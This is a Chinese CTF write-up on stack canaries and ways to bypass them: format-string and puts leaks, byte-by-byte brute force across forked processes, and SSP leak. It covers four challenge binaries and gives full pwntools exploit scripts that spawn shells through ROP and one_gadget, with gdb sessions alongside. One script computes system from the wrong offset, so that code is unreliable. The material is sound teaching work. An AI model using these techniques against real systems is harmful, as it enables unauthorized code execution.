---
title: 绕过ELF的安全防护机制Canary
date: 2019-02-15 16:21:43
tags: [ctf, pwn]
---

入门 canary。

<!-- more -->

# 何为 Canary

由于 `stack overflow` 而引发的攻击非常普遍也非常古老，相应地一种叫做 `Canary` 的技术很早就出现在 `glibc` 里，直到现在也作为系统安全的第一道防线存在。`Canary` 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的 canary 值，栈帧销毁前测试该值是否死掉，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。`Canary` 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 `stack overflow` 发生的高危区域的尾部，当函数返回之时检测 `Canary` 的值是否经过了改变，以此来判断 `stack/buffer overflow` 是否发生。`Canary` 与 Windows 下的 `GS保护` 都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 `linux` 下保护机制的标配。

以 32 位程序为例。没开 Canary 时的栈：

```
+------------------+
|    parameter     |
+------------------+
|    local var1    |
+------------------+
|    local var2    |
+------------------+
|       ebp        |
+------------------+
|    return addr   |
+------------------+
```

开启 Canary 后的栈：

```
+------------------+
|    parameter     |
+------------------+
|    local var1    |
+------------------+
|    local var2    |
+------------------+
|      canary      | <- Random
+------------------+
|       ebp        |
+------------------+
|    return addr   |
+------------------+
```

在 `EBP` 之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测 `Canary` 是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖 `Canary`，这时程序会直接退出。只有泄漏了`Canary`，才能 overflow 后面的 return address：

```gdb
   0x804852b <func+71>:	mov    eax,DWORD PTR [ebp-0xc]
   0x804852e <func+74>:	xor    eax,DWORD PTR gs:0x14
=> 0x8048535 <func+81>:	je     0x804853c <func+88>
 | 0x8048537 <func+83>:	call   0x8048390 <__stack_chk_fail@plt>
 | 0x804853c <func+88>:	leave
 | 0x804853d <func+89>:	ret
 | 0x804853e <main>:	lea    ecx,[esp+0x4]
 |->   0x804853c <func+88>:	leave
       0x804853d <func+89>:	ret
```

如果没有绕过 `Canary`，就会 `call` 到 glibc 中的函数 `__stack_chk_fail`：

```cpp
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

# `Canary` 绕过技术

## 泄漏 `Canary`

`Canary` 设计为以字节 `\x00` 结尾，本意是为了保证 `Canary` 可以截断字符串。泄露栈中的 `Canary` 的思路是覆盖 `Canary` 的低字节，来打印出剩余的 `Canary` 部分。这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 `Canary`，之后再次溢出控制执行流程。如果存在 `format string` 那么还可以泄漏 `Canary`。

### 2016-insomnihack-microwave

`checksec` 一下程序，64 位 elf，保护全开：

```shell
[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

拖进 ida 查看一下程序。程序大概意思是连接推特账户，编辑内容，发布最喜爱食物：

```cpp
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char *v3; // r12
  char input; // [rsp+0h] [rbp-38h]
  unsigned __int64 v5; // [rsp+8h] [rbp-30h]

  v5 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  v3 = (char *)malloc(0x3EuLL);
  puts("\n --------------------------------------------------------");
  puts(" |     Welcome to the next generation of MicroWaves!    |");
  puts(" |                         ***                          |");
  puts(" | This stylish Microwave with Grill function, includes |");
  puts(" |      a function that tweets your favourite food!     |");
  puts(" |                         ***                          |");
  puts(" --------------------------------------------------------");
  fflush(0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      choice();
      fwrite("\n           [MicroWave]: ", 1uLL, 0x19uLL, stdout);
      fgets(&input, 3, stdin);
      if ( input != '2' )
        break;
      if ( *((_WORD *)v3 + 30) == 1 )
        edit();
      else
        fwrite("\n      First: please connect to your Twitter account!\n\n", 1uLL, 0x37uLL, stdout);
    }
    if ( input <= '2' )
    {
      if ( input == '1' )                       // choice 1
      {
        fwrite("\n           Log in on Twitter:\n", 1uLL, 0x1FuLL, stdout);
        fwrite("           username: ", 1uLL, 0x15uLL, stdout);
        fflush(0LL);
        fgets(v3, 40, stdin);
        fwrite("           password: ", 1uLL, 0x15uLL, stdout);
        fflush(0LL);
        fgets(v3 + 40, 20, stdin);
        connect(v3);
      }
    }
    else if ( input == '3' )                    // choice 3
    {
      if ( *((_WORD *)v3 + 30) == 1 )
        tweet();
      else
        fwrite("\n      Hey Dude! This didn't work out!\n\n", 1uLL, 0x28uLL, stdout);
    }
    else if ( input == 'q' )                    // quit
    {
      fwrite("\n           Bye!\n\n", 1uLL, 0x12uLL, stdout);
      exit(0);
    }
  }
}
```

在 `connect()` 函数中，发现了一个需要过的 check 密码，同时还有用户名的输入存在 `format string`，故这里可以泄漏出栈上的 `Canary`：

```cpp
unsigned __int64 __fastcall connect(char *input)
{
  size_t j; // rbx
  char *string; // rbx
  size_t v3; // rax
  __int64 i; // rdx
  unsigned __int64 v6; // [rsp+8h] [rbp-20h]

  j = 1LL;
  v6 = __readfsqword(0x28u);
  __printf_chk(1LL, (__int64)"\nChecking ");
  __printf_chk(1LL, (__int64)input);
  puts("Twitter account");
  fflush(0LL);
  while ( j < strlen(input + 40) )
  {
    ++j;
    putchar('.');
    fflush(0LL);
    usleep(0x186A0u);
  }
  putchar('\n');
  string = password;
  v3 = strlen(password);
  for ( i = 0LL; ; ++i )
  {
    if ( i == v3 )
    {
      *((_WORD *)input + 30) = 1;
      return __readfsqword(0x28u) ^ v6;
    }
    if ( input[i + 40] != string[i] )
      break;
  }
  *((_WORD *)input + 30) = 0;
  return __readfsqword(0x28u) ^ v6;
}
```

在 `edit()` 函数中存在 `buffer overflow`，读了很长一串字符：

```cpp
unsigned __int64 edit()
{
  __int64 v1; // [rsp+0h] [rbp-418h]
  unsigned __int64 v2; // [rsp+408h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  __printf_chk(1LL, (__int64)"\n           #> ");
  fflush(0LL);
  read(0, &v1, 0x800uLL);
  puts("\n           Done.");
  return __readfsqword(0x28u) ^ v2;
}
```

同时通过调试可以找到栈上的某个值与 libc 的偏移，以用来计算 base：

```gdb
assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwave
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./microwave...(no debugging symbols found)...done.
assassinq>> set environment LD_LIBRARY_PATH=./libc.so.6
assassinq>> r
Starting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave

 --------------------------------------------------------
 |     Welcome to the next generation of MicroWaves!    |
 |                         ***                          |
 | This stylish Microwave with Grill function, includes |
 |      a function that tweets your favourite food!     |
 |                         ***                          |
 --------------------------------------------------------
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill & Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 1

           Log in on Twitter:
           username: %p.%p.%p.%p.%p.%p.%p.%p
           password: n07_7h3_fl46

Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710
Twitter account
............
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill & Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: ^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00
RBX: 0x7ffff7dd18e0 --> 0xfbad2288
RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x400
RSI: 0x555555759060 ("n07_7h3_fl46\np.%p.%p.%p\n")
RDI: 0x0
RBP: 0x7ffff7dd2620 --> 0xfbad2887
RSP: 0x7fffffffda28 --> 0x7ffff7a875e8 (<_IO_new_file_underflow+328>:	cmp    rax,0x0)
RIP: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7ffff7dd3780 --> 0x0
R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)
R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)
R11: 0x246
R12: 0xa ('\n')
R13: 0x2
R14: 0x55555575906d ("p.%p.%p.%p\n")
R15: 0x7ffff7dd18e0 --> 0xfbad2288
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7b04257 <read+7>:	jne    0x7ffff7b04269 <read+25>
   0x7ffff7b04259 <__read_nocancel>:	mov    eax,0x0
   0x7ffff7b0425e <__read_nocancel+5>:	syscall
=> 0x7ffff7b04260 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7ffff7b04266 <__read_nocancel+13>:	jae    0x7ffff7b04299 <read+73>
   0x7ffff7b04268 <__read_nocancel+15>:	ret
   0x7ffff7b04269 <read+25>:	sub    rsp,0x8
   0x7ffff7b0426d <read+29>:	call   0x7ffff7b220d0 <__libc_enable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffda28 --> 0x7ffff7a875e8 (<_IO_new_file_underflow+328>:	cmp    rax,0x0)
0008| 0x7fffffffda30 --> 0x7ffff7dd26a3 --> 0xdd3780000000000a
0016| 0x7fffffffda38 --> 0x7ffff7dd18e0 --> 0xfbad2288
0024| 0x7fffffffda40 --> 0x7fffffffdae0 --> 0x7fffff000a31
0032| 0x7fffffffda48 --> 0x7ffff7a8860e (<__GI__IO_default_uflow+14>:	cmp    eax,0xffffffff)
0040| 0x7fffffffda50 --> 0x0
0048| 0x7fffffffda58 --> 0x7ffff7a7bc6a (<__GI__IO_getline_info+170>:	cmp    eax,0xffffffff)
0056| 0x7fffffffda60 --> 0x19
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
assassinq>> vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555557000 r-xp	/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave
0x0000555555757000 0x0000555555758000 r--p	/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave
0x0000555555758000 0x0000555555759000 rw-p	/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave
0x0000555555759000 0x000055555577a000 rw-p	[heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fd7000 0x00007ffff7fda000 rw-p	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffdd000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

最后放上 exp：

```python
#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
local = 0
if local:
	p = process('./microwave')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc_base_offset = 0xf72c0
	one_gadget_offset = 0x45216
else:
	p = remote('127.0.0.1', 1337)
	libc = ELF('./libc.so.6')
	libc_base_offset = 0xeb870
	one_gadget_offset = 0x464d8
elf = ELF('./microwave')
log.success('libc_base_offset = ' + hex(libc_base_offset))
log.success('one_gadget_offset = ' + hex(one_gadget_offset))

def connect(username, password):
	p.sendlineafter('[MicroWave]:', '1')
	p.sendlineafter('username:', username)
	p.sendlineafter('password:', password)

def edit(content):
	p.sendlineafter('[MicroWave]:', '2')
	p.sendlineafter('#>', content)

def tweet():
	p.sendlineafter('[MicroWave]:', '3')

def quit():
	p.sendlineafter('[MicroWave]:', 'q')

# gdb.attach(p)
password = 'n07_7h3_fl46'
connect('%p.' * 8, password)
p.recvuntil('Checking')
leak_data = p.recvline().strip().split('.')[:-1]
print leak_data
canary = int(leak_data[5][2:], 16)
log.success('canary = ' + hex(canary))
leak_libc = int(leak_data[1][2:], 16)
log.success('leak_libc = ' + hex(leak_libc))
libc_base = leak_libc - libc_base_offset
log.success('libc_base = ' + hex(libc_base))
one_gadget = libc_base + one_gadget_offset
log.success('one_gadget = ' + hex(one_gadget))
payload = flat([
	'A' * 1032,
	canary,
	'B' * 8,
	one_gadget
])
edit(payload)
p.interactive()
```

### 2017-CSAW-Quals-scv

开了 `Canary`：

```
[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

就只有一个 main 函数，由于是 c++ 程序，看起来有点混乱：

```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v21; // rax
  int choice; // [rsp+4h] [rbp-BCh]
  int v24; // [rsp+8h] [rbp-B8h]
  int v25; // [rsp+Ch] [rbp-B4h]
  char buf; // [rsp+10h] [rbp-B0h]
  unsigned __int64 v27; // [rsp+B8h] [rbp-8h]

  v27 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  choice = 0;
  v24 = 1;
  v25 = 0;
  while ( v24 )
  {
    v3 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
    std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
    v4 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]SCV GOOD TO GO,SIR....");
    std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
    v5 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
    std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
    v6 = std::operator<<<std::char_traits<char>>(&std::cout, "1.FEED SCV....");
    std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
    v7 = std::operator<<<std::char_traits<char>>(&std::cout, "2.REVIEW THE FOOD....");
    std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
    v8 = std::operator<<<std::char_traits<char>>(&std::cout, "3.MINE MINERALS....");
    std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
    v9 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
    std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
    std::operator<<<std::char_traits<char>>(&std::cout, ">>");
    std::istream::operator>>(&std::cin, &choice);
    switch ( choice )
    {
      case 2:                                   // show
        v15 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
        std::ostream::operator<<(v15, &std::endl<char,std::char_traits<char>>);
        v16 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]REVIEW THE FOOD...........");
        std::ostream::operator<<(v16, &std::endl<char,std::char_traits<char>>);
        v17 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
        std::ostream::operator<<(v17, &std::endl<char,std::char_traits<char>>);
        v18 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]PLEASE TREAT HIM WELL.....");
        std::ostream::operator<<(v18, &std::endl<char,std::char_traits<char>>);
        v19 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
        std::ostream::operator<<(v19, &std::endl<char,std::char_traits<char>>);
        puts(&buf);
        break;
      case 3:                                   // exit
        v24 = 0;
        v20 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]BYE ~ TIME TO MINE MIENRALS...");
        std::ostream::operator<<(v20, &std::endl<char,std::char_traits<char>>);
        break;
      case 1:                                   // edit
        v10 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
        std::ostream::operator<<(v10, &std::endl<char,std::char_traits<char>>);
        v11 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]SCV IS ALWAYS HUNGRY.....");
        std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
        v12 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
        std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
        v13 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]GIVE HIM SOME FOOD.......");
        std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
        v14 = std::operator<<<std::char_traits<char>>(&std::cout, "-------------------------");
        std::ostream::operator<<(v14, &std::endl<char,std::char_traits<char>>);
        std::operator<<<std::char_traits<char>>(&std::cout, ">>");
        v25 = read(0, &buf, 0xF8uLL);
        break;
      default:
        v21 = std::operator<<<std::char_traits<char>>(&std::cout, "[*]DO NOT HURT MY SCV....");
        std::ostream::operator<<(v21, &std::endl<char,std::char_traits<char>>);
        break;
    }
  }
  return 0LL;
}
```

在 `case 1` 存在 `buffer overflow`，通过调试观察到输入与 `Canary` 之间的偏移为 168。如果要泄漏 `Canary` 的话，就必须让所有的 `\x00` 被覆盖掉，包括 `Canary` 低位的 `\x00`，以让 `puts` 认为 buf 连同 `Canary` 为一个字符串。libc 也可以用同样的方式泄漏，最后放上 exp：

```python
#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
local = 1
if local:
	p = process('./scv', env={'LD_PRELOAD':'./libc-2.23.so'})
else:
	p = remote('127.0.0.1', 8888)
libc = ELF('./libc-2.23.so')
elf = ELF('./scv')
# gdb.attach(p)
system_offset = libc.symbols['system']
str_bin_sh_offset = next(libc.search('/bin/sh'))
log.success('system_offset = ' + hex(system_offset))
log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))
pop_rdi_ret = 0x0000000000400ea3
log.success('pop_rdi_ret = ' + hex(pop_rdi_ret))
one_gadget_offset = 0x45216
log.success('one_gadget_offset = ' + hex(one_gadget_offset))
libc_base_offset = 0x3a20a
log.success('libc_base_offset = ' + hex(libc_base_offset))

def edit(content):
	p.sendlineafter('>>', '1')
	p.recvuntil('>>')
	p.send(content)

def show():
	p.sendlineafter('>>', '2')

def quit():
	p.sendlineafter('>>', '3')

edit('A' * (40 - 1) + ':')
show()
p.recvuntil(':')
leak_addr = u64(p.recv(6).ljust(8, '\x00'))
log.success('leak_addr = ' + hex(leak_addr))
libc_base = leak_addr - libc_base_offset
log.success('libc_base = ' + hex(libc_base))
system = libc_base + str_bin_sh_offset
str_bin_sh = libc_base + str_bin_sh_offset
log.success('system = ' + hex(system))
log.success('str_bin_sh = ' + hex(str_bin_sh))
edit('A' * 168 + ':')
show()
p.recvuntil(':')
canary = u64('\x00' + p.recv(7))
log.success('canary = ' + hex(canary))
payload = flat([
	'A' * 168,
	canary,
	'B' * 8,
	pop_rdi_ret,
	str_bin_sh,
	system
])
edit(payload)
quit()
p.interactive()
```

## 爆破 `Canary`

`Canary` 之所以被认为是安全的，是因为对其进行爆破成功率太低。以 32 位程序为例，除去最后一个 `\x00`，其可能值将会是 `0x100^3=16777216`（实际上由于 `Canary` 的生成规则会小于这个值），64 位下的`Canary` 值更是远大于这个数量级。此外，一旦 `Canary` 爆破失败，程序就会立即结束，`Canary` 值也会再次更新，使得爆破更加困难。但是同一个进程内所有的 `Canary` 值都是一致的，当程序有多个进程，且子进程内出现了栈溢出时，由于子进程崩溃不会影响到主进程，我们就可以进行爆破。甚至我们可以通过逐位爆破来减少爆破时间。

### 2017-NSCTF-pwn2

```shell
[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

开启了 `Canary`。main 函数中看到只要每次回答 `Y`，可以无限次地 fork 出新的进程：

```cpp
int __cdecl main()
{
  char v1; // [esp+1Bh] [ebp-5h]
  __pid_t pid; // [esp+1Ch] [ebp-4h]

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  while ( 1 )
  {
    write(1, "[*] Do you love me?[Y]\n", 0x17u);
    if ( getchar() != 'Y' )
      break;
    v1 = getchar();
    while ( v1 != '\n' && v1 )
      ;
    pid = fork();
    if ( pid )
    {
      if ( pid <= 0 )
      {
        if ( pid < 0 )
          exit(0);
      }
      else                                      // son
      {
        wait(0);
      }
    }
    else                                        // father
    {
      func();
    }
  }
  return 0;
}
```

`func()` 函数中存在 `buffer overflow`，而且还存在 `format string`，那这里其实是可以用这个漏洞泄漏出 `Canary` 的：

```cpp
unsigned int func()
{
  char *s; // ST18_4
  int buf; // [esp+1Ch] [ebp-1Ch]
  int v3; // [esp+20h] [ebp-18h]
  int v4; // [esp+24h] [ebp-14h]
  int v5; // [esp+28h] [ebp-10h]
  unsigned int v6; // [esp+2Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  buf = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  s = (char *)malloc(0x40u);
  input_name(&buf);
  sprintf(s, "[*] Welcome to the game %s", &buf);
  printf(s);
  puts("[*] Input Your Id:");
  read(0, &buf, 0x100u);
  return __readgsdword(0x14u) ^ v6;
}
```

`Canary` 采用爆破的方法，libc 则可以用格式化字符串泄漏。放上逐字节爆破 exp：

```python
#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'i386'
p = process('./pwn2', env={'LD_RELOAD':'./libc.so.6_x86'})
elf = ELF('./pwn2')
libc = ELF('./libc.so.6_x86')
system_offset = libc.symbols['system']
str_bin_sh_offset = next(libc.search('/bin/sh'))
log.success('system_offset = ' + hex(system_offset))
log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))
libc_offset = 0x1b2000
log.success('libc_offset = ' + hex(libc_offset))
one_gadget_offset = 0x3af1c
log.success('one_gadget_offset = ' + hex(one_gadget_offset))
# gdb.attach(p)

def forkNew():
	p.sendlineafter('[Y]', 'Y')

def inputName(name):
	p.recvuntil('[*] Input Your name please:')
	p.send(name)

def inputId(Id):
	p.recvuntil('[*] Input Your Id:')
	p.send(Id)

canary = '\x00'
for i in range(3):
	for j in range(256):
		# log.info('try ' + hex(j))
		if i != 0 and j == 0:
			p.sendline('Y')
		else:
			forkNew()
		inputName('%12$p\n')
		p.recvuntil('[*] Welcome to the game ')
		leak_addr = int(p.recv(10), 16)
		payload = 'A' * 16
		payload += canary
		payload += chr(j)
		inputId(payload)
		p.recv()
		if 'smashing' not in  p.recv():
			canary += chr(j)
			log.info('At round %d find canary byte %#x' %(i, j))
			break

log.success('canary = ' + hex(u32(canary)))
log.success('leak_addr = ' + hex(leak_addr))
libc_base = leak_addr - libc_offset
log.success('libc_base = ' + hex(libc_base))
system = libc_base + system_offset
str_bin_sh = libc_base + str_bin_sh_offset
one_gadget = libc_base + one_gadget_offset
log.success('system = ' + hex(system))
log.success('str_bin_sh = ' + hex(str_bin_sh))
log.success('one_gadget = ' + hex(one_gadget))
p.sendline('Y')
inputName('AssassinQ\n')
payload = flat([
	'A' * 16,
	canary,
	'B' * 12,
	one_gadget
])
inputId(payload)
p.interactive()
```

## `SSP（Stack Smashing Protect） Leak`

除了通过各种方法泄露 `Canary` 之外，我们还可以利用 `__stack_chk_fail` 函数泄露信息。这种方法作用不大，没办法让我们 `get shell`。但是当我们需要泄露的 flag 或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做 `SSP（Stack Smashing Protect） Leak`。

```cpp
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

![](/pics/绕过ELF的安全防护机制Canary/1.png)

### JarvisOJ-Smashes

```shell
[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

开了 `Canary`，存在溢出但是没法泄漏：

```cpp
unsigned __int64 sub_4007E0()
{
  __int64 i; // rbx
  int c; // eax
  __int64 v3; // [rsp+0h] [rbp-128h]
  unsigned __int64 v4; // [rsp+108h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "Hello!\nWhat's your name? ");
  if ( !_IO_gets((__int64)&v3) )
LABEL_9:
    _exit(1);
  i = 0LL;
  __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    c = _IO_getc(stdin);
    if ( c == -1 )
      goto LABEL_9;
    if ( c == '\n' )
      break;
    flag[i++] = c;
    if ( i == 32 )
      goto LABEL_8;
  }
  memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));
LABEL_8:
  puts("Thank you, bye!");
  return __readfsqword(0x28u) ^ v4;
}
```

这里想到 `SSP Leak`，只要我们能够输入足够长的字符串覆盖掉 `argv[0]`，我们就能让 `Canary` 保护输出我们想要地址上的值：

```
.rodata:000000000040094E ; char s[]
.rodata:000000000040094E s               db 'Thank you, bye!',0  ; DATA XREF: sub_4007E0:loc_400878↑o
.rodata:000000000040095E                 align 20h
```

尝试输出字符串 s：

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
p = remote('pwn.jarvisoj.com', 9877)
test = 0x40094E
p.recvuntil('What\'s your name?')
p.sendline(p64(test) * 200)
p.recvuntil('Please overwrite the flag:')
p.sendline()
p.recvall()
p.interactive()
```

得到的结果果然泄漏出来了：

```shell
[DEBUG] Received 0x4c bytes:
    'Thank you, bye!\n'
    '*** stack smashing detected ***: Thank you, bye! terminated\n'
```

那么接下来需要做的就是找到存放 flag 的地址，在 ida 上找到是 `0x600d21`，但是由于 main 函数中最后一句话 `memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));`，在调用 `__stack_chk_fail()` 的时候，`0x600d21` 上的值早就已经被覆盖成其它值了。通过 gdb 调试，发现在另一个地址也有 flag：

```gdb
assassinq>> find 'CTF'
Searching for 'CTF' in: None ranges
Found 2 results, display max 2 items:
smashes : 0x400d21 ("CTF{Here's the flag on server}")
smashes : 0x600d21 ("CTF{Here's the flag on server}")
```

这里就涉及到了 elf 文件的重映射，当可执行文件足够小的时候，文件的不同区段可能会被多次映射：

```
assassinq>> vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes
0x00600000         0x00601000         rw-p	/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fd7000 0x00007ffff7fda000 rw-p	mapped
